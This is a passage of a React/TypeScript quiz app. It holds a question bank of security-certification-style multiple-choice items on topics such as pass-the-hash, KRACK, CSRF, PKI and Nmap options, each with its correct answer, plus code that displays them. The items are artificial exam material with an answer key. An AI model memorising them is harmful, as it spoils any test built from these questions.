      'In an attempt to damage the reputation of a competitor organization, Hailey, a professional hacker, gathers a list of employee and client email addresses and other related information by using various search engines, social networking sites, and web spidering tools. In this process, she also uses an automated tool to gather a list of words from the target website to further perform a brute-force attack on the previously gathered email addresses. What is the tool used by Hailey for gathering a list of words from the target website?',
    options: ['CeWL', 'Orbot', 'Shadowsocks', 'Psiphon'],
    correctAnswer: 'CeWL',
  },
  {
    question:
      'An attacker decided to crack the passwords used by industrial control systems. In this process, he employed a loop strategy to recover these passwords. He used one character at a time to check whether the first character entered is correct; if so, he continued the loop for consecutive characters. If not, he terminated the loop. Furthermore, the attacker checked how much time the device took to finish one complete password authentication process, through which he deduced how many characters entered are correct. What is the attack technique employed by the attacker to crack the passwords of the industrial control systems?',
    options: [
      'Buffer overflow attack',
      'Side-channel attack',
      'Denial-of-service attack',
      'HMI-based attack',
    ],
    correctAnswer: 'Side-channel attack',
  },
  {
    question:
      'According to the NIST cloud deployment reference architecture, which of the following provides connectivity and transport services to consumers?',
    options: [
      'Cloud connector',
      'Cloud broker',
      'Cloud carrier',
      'Cloud provider',
    ],
    correctAnswer: 'Cloud carrier',
  },
  {
    question:
      'Mary, a penetration tester, has found password hashes in a client system she managed to breach. She needs to use these passwords to continue with the test, but she does not have time to find the passwords that correspond to these hashes. Which type of attack can she implement in order to continue?',
    options: [
      'Pass the hash',
      'Internal monologue attack',
      'LLMNR/NBT-NS poisoning',
      'Pass the ticket',
    ],
    correctAnswer: 'Pass the hash',
  },
  {
    question:
      'In this attack, an adversary tricks a victim into reinstalling an already-in-use key. This is achieved by manipulating and replaying cryptographic handshake messages. When the victim reinstalls the key, associated parameters such as the incremental transmit packet number and receive packet number are reset to their initial values. What is this attack called?',
    options: ['Evil twin', 'Chop chop attack', 'Wardriving', 'KRACK'],
    correctAnswer: 'KRACK',
  },
  {
    question:
      'While performing online banking using a Web browser, a user receives an email that contains a link to an interesting Web site. When the user clicks on the link, another Web browser session starts and displays a video of cats playing a piano. The next business day, the user receives what looks like an email from his bank, indicating that his bank account has been accessed from a foreign country. The email asks the user to call his bank and verify the authorization of a funds transfer that took place. What Web browser-based security vulnerability was exploited to compromise the user?',
    options: [
      'Clickjacking',
      'Cross-Site Scripting',
      'Cross-Site Request Forgery',
      'Web form input validation',
    ],
    correctAnswer: 'Cross-Site Request Forgery',
  },
  {
    question:
      'Which service in a PKI will vouch for the identity of an individual or company?',
    options: ['KDC', 'CR', 'CBC', 'CA'],
    correctAnswer: 'CA',
  },
  {
    question:
      'Identify the web application attack where the attackers exploit vulnerabilities in dynamically generated web pages to inject client-side script into web pages viewed by other users.',
    options: [
      'LDAP Injection attack',
      'Cross-Site Scripting (XSS)',
      'SQL injection attack',
      'Cross-Site Request Forgery (CSRF)',
    ],
    correctAnswer: 'Cross-Site Scripting (XSS)',
  },
  {
    question:
      'User A is writing a sensitive email message to user B outside the local network. User A has chosen to use PKI to secure his message and ensure only user B can read the sensitive email. At what layer of the OSI layer does the encryption and decryption of the message take place?',
    options: ['Application', 'Transport', 'Session', 'Presentation'],
    correctAnswer: 'Presentation',
  },
  {
    question:
      'A new wireless client is configured to join a 802.11 network. This client uses the same hardware and software as many of the other clients on the network. The client can see the network, but cannot connect. A wireless packet sniffer shows that the Wireless Access Point (WAP) is not responding to the association requests being sent by the wireless client. What is a possible source of this problem?',
    options: [
      "The WAP does not recognize the client's MAC address",
      'The client cannot see the SSID of the wireless network',
      'Client is configured for the wrong channel',
      'The wireless client is not configured to use DHCP',
    ],
    correctAnswer: "The WAP does not recognize the client's MAC address",
  },
  {
    question:
      'If you want to only scan fewer ports than the default scan using Nmap tool, which option would you use?',
    options: ['-r', '-F', '-P', '-sP'],
    correctAnswer: '-F',
  },
  {
    question:
      'Which of the following is the structure designed to verify and authenticate the identity of individuals within the enterprise taking part in a data exchange?',
    options: ['SOA', 'biometrics', 'single sign on', 'PKI'],
    correctAnswer: 'PKI',
  },
  {
    question:
      "You are tasked to perform a penetration test. While you are performing information gathering, you find an employee list in Google. You find the receptionist's email, and you send her an email changing the source email to her boss's email (boss@company). In this email, you ask for a pdf with information. She reads your email and sends back a pdf with links. You exchange the pdf links with your malicious links (these links contain malware) and send back the modified pdf, saying that the links don't work. She reads your email, opens the links, and her machine gets infected. You now have access to the company network. What testing method did you use?",
    options: [
      'Social engineering',
      'Piggybacking',
      'Tailgating',
      'Eavesdropping',
    ],
    correctAnswer: 'Social engineering',
  },
  {
    question:
      'If a tester is attempting to ping a target that exists but receives no response or a response that states the destination is unreachable, ICMP may be disabled and the network may be using TCP. Which other option could the tester use to get a response from a host using TCP?',
    options: ['Traceroute', 'Hping', 'TCP ping', 'Broadcast ping'],
    correctAnswer: 'TCP ping',
  },
  {
    question:
      'Which of the following programs is usually targeted at Microsoft Office products?',
    options: [
      'Polymorphic virus',
      'Multipart virus',
      'Macro virus',
      'Stealth virus',
    ],
    correctAnswer: 'Macro virus',
  },
  {
    question:
      "In an internal security audit, the white hat hacker gains control over a user account and attempts to acquire access to another account's confidential files and information. How can he achieve this?",
    options: [
      'Privilege Escalation',
      'Shoulder-Surfing',
      'Hacking Active Directory',
      'Port Scanning',
    ],
    correctAnswer: 'Privilege Escalation',
  },
  {
    question:
      'A technician is resolving an issue where a computer is unable to connect to the Internet using a wireless access point. The computer is able to transfer files locally to other machines, but cannot successfully reach the Internet. When the technician examines the IP address and default gateway they are both on the 192.168.1.0/24. Which of the following has occurred?',
    options: [
      'The computer is not using a private IP address.',
      'The gateway is not routing to a public IP address.',
      'The gateway and the computer are not on the same network.',
      'The computer is using an invalid IP address.',
    ],
    correctAnswer: 'The gateway is not routing to a public IP address.',
  },
  {
    question:
      'Identify the UDP port that Network Time Protocol (NTP) uses as its primary means of communication?',
    options: ['113', '69', '123', '161'],
    correctAnswer: '123',
  },
  {
    question:
      'While using your bank\'s online servicing you notice the following string in the URL bar: "http://www.MyPersonalBank.com/account?id=368940911028389&Damount=10980&Camount=21" You observe that if you modify the Damount & Camount values and submit the request, that data on the web page reflect the changes. Which type of vulnerability is present on this site?',
    options: [
      'Cookie Tampering',
      'SQL Injection',
      'Web Parameter Tampering',
      'XSS Reflection',
    ],
    correctAnswer: 'Web Parameter Tampering',
  },
  {
    question:
      'Which of the following commands checks for valid users on an SMTP server?',
    options: ['RCPT', 'CHK', 'VRFY', 'EXPN'],
    correctAnswer: 'VRFY',
  },
  {
    question:
      'John wants to send Marie an email that includes sensitive information, and he does not trust the network that he is connected to. Marie gives him the idea of using PGP. What should John do to communicate correctly using this type of encryption?',
    options: [
      'Use his own private key to encrypt the message.',
      'Use his own public key to encrypt the message.',
      "Use Marie's private key to encrypt the message.",
      "Use Marie's public key to encrypt the message.",
    ],
    correctAnswer: "Use Marie's public key to encrypt the message.",
  },
  {
    question:
      'Louis, a professional hacker, had used specialized tools or search engines to encrypt all his browsing activity and navigate anonymously to obtain sensitive/hidden information about official government or federal databases. After gathering the information, he successfully performed an attack on the target government organization without being traced. Which of the following techniques is described in the above scenario?',
    options: [
      'Website footprinting',
      'Dark web footprinting',
      'VPN footprinting',
      'VoIP footprinting',
    ],
    correctAnswer: 'Dark web footprinting',
  },
  {
    question:
      'Dorian is sending a digitally signed email to Poly. With which key is Dorian signing this message and how is Poly validating it?',
    options: [
      "Dorian is signing the message with his public key, and Poly will verify that the message came from Dorian by using Dorian's private key.",
      "Dorian is signing the message with Poly's private key, and Poly will verify that the message came from Dorian by using Dorian's public key.",
      "Dorian is signing the message with his private key, and Poly will verify that the message came from Dorian by using Dorian's public key.",
      "Dorian is signing the message with Poly's public key, and Poly will verify that the message came from Dorian by using Dorian's public key.",
    ],
    correctAnswer:
      "Dorian is signing the message with his private key, and Poly will verify that the message came from Dorian by using Dorian's public key.",
  },
];

function App() {
  const [currentQuestionIndex, setCurrentQuestionIndex] = useState(0);
  const [selectedAnswers, setSelectedAnswers] = useState<{
    [key: number]: string;
  }>({});
  const [revealedAnswers, setRevealedAnswers] = useState<{
    [key: number]: boolean;
  }>({});
  const [showAllQuestions, setShowAllQuestions] = useState(false);

  const toggleReveal = (index: number) => {
    setRevealedAnswers((prev) => ({
      ...prev,
      [index]: !prev[index],
    }));
  };

  const selectAnswer = (questionIndex: number, answer: string) => {
    setSelectedAnswers((prev) => ({
      ...prev,
      [questionIndex]: answer,
    }));
  };

  const goToNextQuestion = () => {
    if (currentQuestionIndex < questions.length - 1) {
      setCurrentQuestionIndex((prev) => prev + 1);
      window.scrollTo(0, 0);
    }
  };

  const goToPreviousQuestion = () => {
    if (currentQuestionIndex > 0) {
      setCurrentQuestionIndex((prev) => prev - 1);
      window.scrollTo(0, 0);
    }
  };

  const goToQuestion = (index: number) => {
    setCurrentQuestionIndex(index);
    setShowAllQuestions(false);
    window.scrollTo(0, 0);
  };

  const toggleShowAllQuestions = () => {
    setShowAllQuestions((prev) => !prev);
  };

  const renderQuestion = (question: Question, index: number) => {
    return (
      <div key={index} className="bg-white p-6 rounded-lg shadow-md mb-4">
        <div className="flex justify-between items-center mb-6">
          <h2 className="text-xl font-bold text-gray-900">
            Question {index + 1}
          </h2>
        </div>

        <div className="mb-8">
          <p className="text-lg font-medium text-gray-900 mb-4">
            {question.question}
          </p>

          <div className="space-y-3 mb-4">
            {question.options.map((option, optIndex) => (
              <div
                key={optIndex}
                onClick={() => selectAnswer(index, option)}
                className={`p-3 rounded cursor-pointer ${
                  selectedAnswers[index] === option && !revealedAnswers[index]
                    ? 'bg-blue-100 border-l-4 border-blue-500'
                    : revealedAnswers[index]
                    ? option === question.correctAnswer
                      ? 'bg-green-100 border-l-4 border-green-500'
                      : option === selectedAnswers[index]
                      ? 'bg-red-100 border-l-4 border-red-500'
                      : 'bg-gray-50'
                    : 'bg-gray-50 hover:bg-gray-100'
                }`}
              >
                <p className="text-gray-800">{option}</p>
              </div>
            ))}
          </div>

          <button
            onClick={() => toggleReveal(index)}
            className="flex items-center gap-2 px-4 py-2 bg-blue-600 text-white rounded hover:bg-blue-700 transition-colors"
          >
            {revealedAnswers[index] ? (
              <>
                <EyeOff size={18} /> Hide Answer
              </>
            ) : (
              <>
                <Eye size={18} /> Show Answer
              </>
            )}
          </button>
        </div>
      </div>
    );
  };

  return (
    <div className="min-h-screen bg-gray-100 p-4 md:p-8">
      <div className="max-w-4xl mx-auto">
        <div className="flex flex-col md:flex-row justify-between items-center mb-6 gap-4">
          <h1 className="text-2xl md:text-3xl font-bold text-gray-900">
            Security Quiz
          </h1>
          <button
            onClick={toggleShowAllQuestions}
            className="w-full md:w-auto px-4 py-2 bg-indigo-600 text-white rounded hover:bg-indigo-700 transition-colors"
          >
            {showAllQuestions ? 'Show Current Question' : 'Show All Questions'}
          </button>
        </div>

        {showAllQuestions ? (
          <div className="space-y-6">
            {questions.map((question, index) =>
              renderQuestion(question, index)
            )}
          </div>
        ) : (
          <>
            {renderQuestion(
              questions[currentQuestionIndex],
              currentQuestionIndex
            )}
            <div className="flex items-center justify-between mt-6 gap-4">
              <button
                onClick={goToPreviousQuestion}
                disabled={currentQuestionIndex === 0}
                className={`flex items-center gap-2 px-4 py-2 rounded transition-colors ${
                  currentQuestionIndex === 0
                    ? 'bg-gray-300 cursor-not-allowed'
                    : 'bg-gray-600 text-white hover:bg-gray-700'
                }`}
              >
                <ChevronLeft size={18} /> Previous
              </button>
              <span className="text-gray-600 text-sm md:text-base font-medium">
                Question {currentQuestionIndex + 1} of {questions.length}
              </span>
              <button
                onClick={goToNextQuestion}
                disabled={currentQuestionIndex === questions.length - 1}
                className={`flex items-center gap-2 px-4 py-2 rounded transition-colors ${
                  currentQuestionIndex === questions.length - 1
                    ? 'bg-gray-300 cursor-not-allowed'
                    : 'bg-gray-600 text-white hover:bg-gray-700'
                }`}
              >
                Next <ChevronRight size={18} />
              </button>
            </div>
          </>
        )}
      </div>
    </div>
  );
}

export default App;
